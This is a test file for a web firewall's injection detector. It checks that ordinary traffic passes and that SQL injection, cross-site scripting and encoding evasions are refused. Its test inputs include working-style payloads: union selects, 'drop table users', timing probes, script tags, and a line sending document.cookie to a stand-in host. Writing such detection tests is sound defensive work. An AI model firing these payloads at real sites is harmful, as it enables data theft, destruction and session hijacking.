/**
 * This control is on by default on every scope, which makes the false positive the
 * expensive mistake by a wide margin: an attack it misses is one an attacker still has
 * to land, and a real URL it refuses is a broken site on an instance nobody touched.
 * So the traffic it must let through is asserted first and in more detail than the
 * traffic it refuses.
 */

import { describe, expect, it } from "vitest";
import { injectionFailure } from "../src/waf-injection.js";

/** A real browser's user agent, which is scanned on every request. */
const CHROME =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

describe("traffic it lets through", () => {
    it("passes ordinary paths and queries", () => {
        expect(injectionFailure({ path: "/api/users/42" })).toBeNull();
        expect(injectionFailure({ path: "/_next/static/chunks/main-app.9f3c.js", query: "v=3" })).toBeNull();
        expect(injectionFailure({ path: "/blog/why-we-moved-off-docker", query: "page=2&sort=recent" })).toBeNull();
        expect(injectionFailure({ path: "/", query: "utm_source=google&utm_campaign=spring+sale" })).toBeNull();
    });

    it("passes a real browser's user agent", () => {
        expect(injectionFailure({ path: "/", userAgent: CHROME })).toBeNull();
        expect(injectionFailure({ path: "/", userAgent: "curl/8.7.1" })).toBeNull();
    });

    it("passes a search someone actually typed", () => {
        expect(injectionFailure({ query: "q=black+and+white+t-shirt" })).toBeNull();
        expect(injectionFailure({ query: "q=I+don't+like+it" })).toBeNull();
        expect(injectionFailure({ query: "q=10+or+20+items" })).toBeNull();
        expect(injectionFailure({ query: "q=%3Cb%3Ebold%3C%2Fb%3E" })).toBeNull();
    });

    it("passes a filter that compares names rather than constants", () => {
        // The whole false-positive defence: an injected condition has to be true
        // whatever the row holds, so it compares constants. This one does not.
        expect(injectionFailure({ query: "filter=name or type=product" })).toBeNull();
        expect(injectionFailure({ query: "where=owner and status=open" })).toBeNull();
    });

    it("passes keywords that are separated by a parameter rather than by space", () => {
        expect(injectionFailure({ path: "/credit-union/select-a-plan", query: "step=2 of 3" })).toBeNull();
        expect(injectionFailure({ query: "sort=select&group=from" })).toBeNull();
        expect(injectionFailure({ query: "a=union&b=select" })).toBeNull();
    });

    it("passes words that only mean something in context", () => {
        expect(injectionFailure({ path: "/docs/sleep", query: "note=a b" })).toBeNull();
        expect(injectionFailure({ query: "online=1&onward=2&document=3" })).toBeNull();
        expect(injectionFailure({ query: "drop=1&table=users" })).toBeNull();
        expect(injectionFailure({ path: "/docs/Web/JavaScript/Reference", query: "x=a b" })).toBeNull();
    });

    it("passes a link and an encoded url as a value", () => {
        expect(injectionFailure({ query: "redirect=https%3A%2F%2Fexample.com%2Fa+b" })).toBeNull();
        expect(injectionFailure({ path: "/files/report (final).pdf" })).toBeNull();
    });

    it("passes a two-dash slug, which is not a comment", () => {
        expect(injectionFailure({ path: "/2026/06/post--title", query: "ref=o'brien" })).toBeNull();
    });
});

describe("sql injection", () => {
    it("refuses an always-true condition", () => {
        expect(injectionFailure({ query: "id=1' or 1=1--" })).toBe("sql always-true condition in the query");
        expect(injectionFailure({ query: "id=1 and 1=1" })).toBe("sql always-true condition in the query");
        expect(injectionFailure({ query: "u=admin' or 'a'='a" })).toBe("sql always-true condition in the query");
        expect(injectionFailure({ query: "id=1) or (1=1" })).toBe("sql always-true condition in the query");
    });

    it("refuses a union select", () => {
        expect(injectionFailure({ query: "id=1 union select null,version()" })).toBe("sql union select in the query");
        expect(injectionFailure({ query: "id=1 UNION ALL SELECT 1,2,3" })).toBe("sql union select in the query");
    });

    it("refuses a subquery, a metadata read and a timing probe", () => {
        expect(injectionFailure({ query: "id=1 and (select 1 from users)" })).toBe("sql select in the query");
        expect(injectionFailure({ query: "id=1;select table_name from information_schema.tables" })).toBe(
            "stacked sql statement in the query"
        );
        expect(injectionFailure({ query: "id=1 and sleep(5)" })).toBe("sql function call in the query");
        expect(injectionFailure({ query: "id=1 and extractvalue(1,concat(0x7e,user()))" })).toBe(
            "sql function call in the query"
        );
    });

    it("refuses a second statement and a destructive one", () => {
        expect(injectionFailure({ query: "id=1'; drop table users--" })).toBe("stacked sql statement in the query");
        expect(injectionFailure({ query: "q=drop table users" })).toBe("sql drop statement in the query");
        expect(injectionFailure({ query: "q=delete from orders" })).toBe("sql delete statement in the query");
    });

    it("refuses a comment used to swallow the rest of the statement", () => {
        expect(injectionFailure({ query: "user=admin'--" })).toBe("sql comment in the query");
        expect(injectionFailure({ query: "id=1 /*!50000union*/ 1" })).toBe("sql comment in the query");
    });

    it("refuses a payload in the path and in the user agent", () => {
        expect(injectionFailure({ path: "/product/1' or 1=1" })).toBe("sql always-true condition in the path");
        expect(injectionFailure({ path: "/", userAgent: "sqlmap' union select 1" })).toBe(
            "sql union select in the user agent"
        );
    });
});

describe("cross-site scripting", () => {
    it("refuses a script tag and its friends", () => {
        expect(injectionFailure({ query: "q=<script>alert(1)</script>" })).toBe("html <script> tag in the query");
        expect(injectionFailure({ query: "q=<svg/onload=alert(1)>" })).toBe("html <svg> tag in the query");
        expect(injectionFailure({ query: "next=<iframe src=x>" })).toBe("html <iframe> tag in the query");
    });

    it("refuses an event handler and a script url without a tag", () => {
        expect(injectionFailure({ query: "img=a.png\" onerror=alert(1)" })).toBe("html event handler in the query");
        expect(injectionFailure({ query: "next=javascript:alert(1)" })).toBe("script url in the query");
        expect(injectionFailure({ query: "src=data:text/html;base64,PHN2Zz4=" })).toBe("script url in the query");
    });

    it("refuses a payload that reaches for the document", () => {
        expect(injectionFailure({ query: "q=';fetch('//e.co?c='+document.cookie);'" })).toBe(
            "script object access in the query"
        );
        expect(injectionFailure({ query: "q=eval(atob('YWxlcnQoMSk='))" })).toBe("script call in the query");
    });
});

describe("evasion", () => {
    it("sees through percent-encoding, including twice over", () => {
        expect(injectionFailure({ query: "id=1%27%20or%201%3D1" })).toBe("sql always-true condition in the query");
        expect(injectionFailure({ query: "id=1%2527%2520or%25201%253D1" })).toBe(
            "sql always-true condition in the query"
        );
        expect(injectionFailure({ query: "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" })).toBe(
            "html <script> tag in the query"
        );
    });

    it("sees through case, plus-for-space and an inline comment", () => {
        expect(injectionFailure({ query: "id=1+UNION+SELECT+1" })).toBe("sql union select in the query");
        expect(injectionFailure({ query: "id=1/**/union/**/select/**/1" })).toBe("sql union select in the query");
        expect(injectionFailure({ query: "q=<ScRiPt>" })).toBe("html <script> tag in the query");
    });

    it("reads a header only when it carries a way out of a quoted context", () => {
        // The deliberate line in the header gate, pinned because it is a trade: a
        // header is embedded rather than parsed, so an attack in one has to break out
        // of the quotes it is embedded in, and refusing to scan the rest is what keeps
        // a browser's user agent from being decoded and walked on every request.
        expect(injectionFailure({ userAgent: "Mozilla/5.0 union select 1" })).toBeNull();
        expect(injectionFailure({ userAgent: "Mozilla/5.0 ' union select 1" })).toBe(
            "sql union select in the user agent"
        );
        expect(injectionFailure({ userAgent: "Mozilla/5.0 <script>alert(1)</script>" })).toBe(
            "html <script> tag in the user agent"
        );
    });

    it("leaves a malformed escape as it was sent rather than inventing a character", () => {
        // %2 is not an escape, so nothing here decodes into a quote.
        expect(injectionFailure({ query: "q=a%2zb%2" })).toBeNull();
    });
});
